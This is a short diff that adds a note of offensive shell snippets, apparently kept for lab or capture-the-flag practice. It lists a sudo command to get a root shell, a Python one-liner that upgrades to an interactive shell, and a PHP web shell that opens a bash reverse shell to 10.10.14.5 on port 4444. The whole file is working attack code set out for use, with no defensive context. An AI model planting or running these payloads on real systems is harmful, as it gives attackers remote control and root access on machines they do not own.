@@ -1,0 +1,10 @@
+Scriopt for run root (maybe without password):
+    #!/bin/bash
+    sudo /bin/bash
+
+Switch to a interractive shell:
+    python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Reverse shell script:
+    <?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
+
